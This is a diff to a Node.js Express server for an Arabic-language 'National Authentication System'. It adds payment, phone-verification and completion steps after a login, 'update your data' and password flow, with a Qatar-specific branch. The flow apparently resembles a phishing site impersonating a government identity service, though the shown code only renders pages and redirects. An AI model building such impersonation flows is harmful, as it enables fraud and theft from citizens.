@@ -29,7 +29,8 @@ app.get('/', (req, res) => {
 app.get('/login', (req, res) => {
   res.render('login', {
     title: 'تسجيل الدخول - نظام التوثيق الوطني',
-    currentPage: 'login'
+    currentPage: 'login',
+    currentStep: 0
   });
 });
 
@@ -43,8 +44,9 @@ app.post('/login', (req, res) => {
 // صفحة التنبيه (يجب تحديث بياناتك)
 app.get('/update-notice', (req, res) => {
   res.render('update-notice', {
-    title: 'تنبيه هام - نظام التوثيق الوطني',
-    currentPage: 'update-notice'
+    title: 'تنبيه - نظام التوثيق الوطني',
+    currentPage: 'update-notice',
+    currentStep: 0
   });
 });
 
@@ -52,7 +54,8 @@ app.get('/update-notice', (req, res) => {
 app.get('/step1', (req, res) => {
   res.render('step1', {
     title: 'الخطوة الأولى - نظام التوثيق الوطني',
-    currentPage: 'step1'
+    currentPage: 'step1',
+    currentStep: 1
   });
 });
 
@@ -60,7 +63,8 @@ app.get('/step1', (req, res) => {
 app.get('/step2', (req, res) => {
   res.render('step2', {
     title: 'الخطوة الثانية - نظام التوثيق الوطني',
-    currentPage: 'step2'
+    currentPage: 'step2',
+    currentStep: 3
   });
 });
 
@@ -70,7 +74,8 @@ app.get('/step2Q', (req, res) => {
   res.render('step2Q', {
     title: 'الخطوة الثانية - نظام التوثيق الوطني',
     currentPage: 'step2Q',
-    userType: userType
+    userType: userType,
+    currentStep: 3
   });
 });
 
@@ -78,12 +83,48 @@ app.get('/step2Q', (req, res) => {
 app.get('/step3', (req, res) => {
   res.render('step3', {
     title: 'إنشاء كلمة المرور - نظام التوثيق الوطني',
-    currentPage: 'step3'
+    currentPage: 'step3',
+    currentStep: 2
   });
 });
 
 app.post('/step3', (req, res) => {
-  res.send('تم إنشاء كلمة المرور بنجاح!');
+  res.redirect('/step4');
+});
+
+// الخطوة الرابعة - التسديد
+app.get('/step4', (req, res) => {
+  res.render('step4', {
+    title: 'التسديد - نظام التوثيق الوطني',
+    currentPage: 'step4',
+    currentStep: 4
+  });
+});
+
+app.post('/step4', (req, res) => {
+  res.redirect('/step5');
+});
+
+// الخطوة الخامسة - توثيق رقم الهاتف
+app.get('/step5', (req, res) => {
+  res.render('step5', {
+    title: 'توثيق رقم الهاتف - نظام التوثيق الوطني',
+    currentPage: 'step5',
+    currentStep: 5
+  });
+});
+
+app.post('/step5', (req, res) => {
+  res.redirect('/step6');
+});
+
+// الخطوة السادسة - إتمام التسجيل
+app.get('/step6', (req, res) => {
+  res.render('step6', {
+    title: 'إتمام التسجيل - نظام التوثيق الوطني',
+    currentPage: 'step6',
+    currentStep: 6
+  });
 });
 
 // معالجة جميع الطلبات الأخرى
@@ -100,8 +141,11 @@ app.listen(PORT, () => {
   console.log(`   - http://localhost:${PORT}/step1         (الخطوة الأولى)`);
   console.log(`   - http://localhost:${PORT}/step2         (الخطوة الثانية)`);
   console.log(`   - http://localhost:${PORT}/step2Q        (الخطوة الثانية - قطر)`);
+  console.log(`   - http://localhost:${PORT}/step3         (الخطوة الثالثة - كلمة المرور)`);
+  console.log(`   - http://localhost:${PORT}/step4         (الخطوة الرابعة - التسديد)`);
+  console.log(`   - http://localhost:${PORT}/step5         (الخطوة الخامسة - توثيق الهاتف)`);
+  console.log(`   - http://localhost:${PORT}/step6         (الخطوة السادسة - إتمام التسجيل)`);
   console.log(`\n🎨 Using EJS templates (Dynamic Node.js)`);
   console.log(`\n🔗 Workflow Path:`);
-  console.log(`   / → /login → /update-notice → /step1 → /step2`);
-  console.log(`   / → تسجيل مستخدم جديد → /step1 → /step2`);
+  console.log(`   / → /login → /update-notice → /step1 → /step3 → /step2Q → /step4 → /step5 → /step6`);
 });
